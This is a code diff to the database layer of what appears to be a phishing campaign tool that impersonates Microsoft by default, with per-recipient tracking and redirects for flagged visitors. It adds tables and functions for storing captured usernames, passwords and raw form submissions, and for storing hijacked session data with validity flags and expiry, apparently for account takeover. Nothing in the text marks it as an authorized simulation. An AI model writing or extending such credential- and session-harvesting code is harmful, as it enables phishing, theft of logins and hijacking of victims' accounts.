@@ -86,6 +86,7 @@ CREATE TABLE IF NOT EXISTS campaigns (
     flagged_redirect_url TEXT,
     brand_name TEXT DEFAULT 'Microsoft',
     description TEXT,
+    target_url TEXT DEFAULT '',
     custom_params_json TEXT DEFAULT '{}',
     redirect_chains_json TEXT DEFAULT '{}'
 );
@@ -128,6 +129,48 @@ CREATE TABLE IF NOT EXISTS api_keys (
 );
 
 CREATE INDEX IF NOT EXISTS idx_api_keys_hash ON api_keys(key_hash);
+
+CREATE TABLE IF NOT EXISTS credentials (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    visit_id INTEGER,
+    session_id TEXT,
+    campaign_id TEXT,
+    recipient_id INTEGER,
+    tracking_token TEXT,
+    ip_address TEXT,
+    username_enc TEXT NOT NULL,
+    password_enc TEXT NOT NULL,
+    raw_form_enc TEXT,
+    target_url TEXT,
+    source_url TEXT,
+    user_agent TEXT,
+    device_id TEXT,
+    captured_at TEXT NOT NULL DEFAULT (datetime('now'))
+);
+
+CREATE INDEX IF NOT EXISTS idx_credentials_campaign ON credentials(campaign_id);
+CREATE INDEX IF NOT EXISTS idx_credentials_recipient ON credentials(recipient_id);
+CREATE INDEX IF NOT EXISTS idx_credentials_session ON credentials(session_id);
+
+CREATE TABLE IF NOT EXISTS captured_sessions (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    credential_id INTEGER,
+    campaign_id TEXT,
+    recipient_id INTEGER,
+    tracking_token TEXT,
+    ip_address TEXT,
+    session_data_enc TEXT NOT NULL,
+    target_domain TEXT,
+    user_agent TEXT,
+    device_id TEXT,
+    valid INTEGER NOT NULL DEFAULT 1,
+    captured_at TEXT NOT NULL DEFAULT (datetime('now')),
+    expires_at TEXT
+);
+
+CREATE INDEX IF NOT EXISTS idx_captured_sessions_campaign ON captured_sessions(campaign_id);
+CREATE INDEX IF NOT EXISTS idx_captured_sessions_credential ON captured_sessions(credential_id);
+CREATE INDEX IF NOT EXISTS idx_captured_sessions_recipient ON captured_sessions(recipient_id);
 """
 
 
@@ -310,9 +353,9 @@ def save_campaign_db(campaign_data: dict[str, Any], cfg: Config) -> None:
         conn.execute(
             """INSERT OR REPLACE INTO campaigns
             (id, name, template, created_at, active, safe_redirect_url,
-             flagged_redirect_url, brand_name, description,
+             flagged_redirect_url, brand_name, description, target_url,
              custom_params_json, redirect_chains_json)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (
                 campaign_data["id"],
                 campaign_data["name"],
@@ -323,6 +366,7 @@ def save_campaign_db(campaign_data: dict[str, Any], cfg: Config) -> None:
                 campaign_data.get("flagged_redirect_url", ""),
                 campaign_data.get("brand_name", "Microsoft"),
                 campaign_data.get("description", ""),
+                campaign_data.get("target_url", ""),
                 json.dumps(campaign_data.get("custom_params", {})),
                 json.dumps(campaign_data.get("redirect_chains", {})),
             ),
@@ -338,6 +382,7 @@ def load_campaign_db(campaign_id: str, cfg: Config) -> dict[str, Any] | None:
             return None
         d = dict(row)
         d["active"] = bool(d["active"])
+        d["target_url"] = d.get("target_url", "")
         d["custom_params"] = json.loads(d.pop("custom_params_json", "{}"))
         d["redirect_chains"] = json.loads(d.pop("redirect_chains_json", "{}"))
         return d
@@ -352,6 +397,7 @@ def list_campaigns_db(cfg: Config) -> list[dict[str, Any]]:
         for row in rows:
             d = dict(row)
             d["active"] = bool(d["active"])
+            d["target_url"] = d.get("target_url", "")
             d["custom_params"] = json.loads(d.pop("custom_params_json", "{}"))
             d["redirect_chains"] = json.loads(d.pop("redirect_chains_json", "{}"))
             results.append(d)
@@ -571,5 +617,141 @@ def revoke_api_key(cfg: Config, key_id: int) -> bool:
     with get_db(cfg) as conn:
         cur = conn.execute(
             "UPDATE api_keys SET active = 0 WHERE id = ?", (key_id,)
+        )
+        return cur.rowcount > 0
+
+
+# --- Credential storage --------------------------------------------------
+
+def save_credential(cfg: Config, data: dict[str, Any]) -> int:
+    with get_db(cfg) as conn:
+        cur = conn.execute(
+            """INSERT INTO credentials (
+                visit_id, session_id, campaign_id, recipient_id,
+                tracking_token, ip_address, username_enc, password_enc,
+                raw_form_enc, target_url, source_url, user_agent, device_id
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+            (
+                data.get("visit_id"),
+                data.get("session_id"),
+                data.get("campaign_id"),
+                data.get("recipient_id"),
+                data.get("tracking_token"),
+                data.get("ip_address"),
+                data["username_enc"],
+                data["password_enc"],
+                data.get("raw_form_enc"),
+                data.get("target_url"),
+                data.get("source_url"),
+                data.get("user_agent"),
+                data.get("device_id"),
+            ),
+        )
+        return cur.lastrowid or 0
+
+
+def list_credentials(
+    cfg: Config,
+    campaign_id: str | None = None,
+    limit: int = 50,
+    offset: int = 0,
+) -> list[dict[str, Any]]:
+    conditions: list[str] = []
+    params: list[Any] = []
+    if campaign_id:
+        conditions.append("campaign_id = ?")
+        params.append(campaign_id)
+    where = f"WHERE {' AND '.join(conditions)}" if conditions else ""
+    params.extend([limit, offset])
+    with get_db(cfg) as conn:
+        rows = conn.execute(
+            f"SELECT * FROM credentials {where} ORDER BY id DESC LIMIT ? OFFSET ?",
+            params,
+        ).fetchall()
+        return [dict(row) for row in rows]
+
+
+def get_credential(cfg: Config, credential_id: int) -> dict[str, Any] | None:
+    with get_db(cfg) as conn:
+        row = conn.execute(
+            "SELECT * FROM credentials WHERE id = ?", (credential_id,)
+        ).fetchone()
+        return dict(row) if row else None
+
+
+def get_credential_stats(cfg: Config, campaign_id: str | None = None) -> dict[str, Any]:
+    condition = "WHERE campaign_id = ?" if campaign_id else ""
+    params = [campaign_id] if campaign_id else []
+    with get_db(cfg) as conn:
+        row = conn.execute(
+            f"""SELECT
+                COUNT(*) as total,
+                COUNT(DISTINCT ip_address) as unique_ips,
+                COUNT(DISTINCT recipient_id) as unique_recipients
+            FROM credentials {condition}""",
+            params,
+        ).fetchone()
+        return dict(row) if row else {}
+
+
+# --- Captured session storage ---------------------------------------------
+
+def save_captured_session(cfg: Config, data: dict[str, Any]) -> int:
+    with get_db(cfg) as conn:
+        cur = conn.execute(
+            """INSERT INTO captured_sessions (
+                credential_id, campaign_id, recipient_id, tracking_token,
+                ip_address, session_data_enc, target_domain, user_agent,
+                device_id, expires_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+            (
+                data.get("credential_id"),
+                data.get("campaign_id"),
+                data.get("recipient_id"),
+                data.get("tracking_token"),
+                data.get("ip_address"),
+                data["session_data_enc"],
+                data.get("target_domain"),
+                data.get("user_agent"),
+                data.get("device_id"),
+                data.get("expires_at"),
+            ),
+        )
+        return cur.lastrowid or 0
+
+
+def list_captured_sessions(
+    cfg: Config,
+    campaign_id: str | None = None,
+    limit: int = 50,
+    offset: int = 0,
+) -> list[dict[str, Any]]:
+    conditions: list[str] = []
+    params: list[Any] = []
+    if campaign_id:
+        conditions.append("campaign_id = ?")
+        params.append(campaign_id)
+    where = f"WHERE {' AND '.join(conditions)}" if conditions else ""
+    params.extend([limit, offset])
+    with get_db(cfg) as conn:
+        rows = conn.execute(
+            f"SELECT * FROM captured_sessions {where} ORDER BY id DESC LIMIT ? OFFSET ?",
+            params,
+        ).fetchall()
+        return [dict(row) for row in rows]
+
+
+def get_captured_session(cfg: Config, session_id: int) -> dict[str, Any] | None:
+    with get_db(cfg) as conn:
+        row = conn.execute(
+            "SELECT * FROM captured_sessions WHERE id = ?", (session_id,)
+        ).fetchone()
+        return dict(row) if row else None
+
+
+def invalidate_captured_session(cfg: Config, session_id: int) -> bool:
+    with get_db(cfg) as conn:
+        cur = conn.execute(
+            "UPDATE captured_sessions SET valid = 0 WHERE id = ?", (session_id,)
         )
         return cur.rowcount > 0
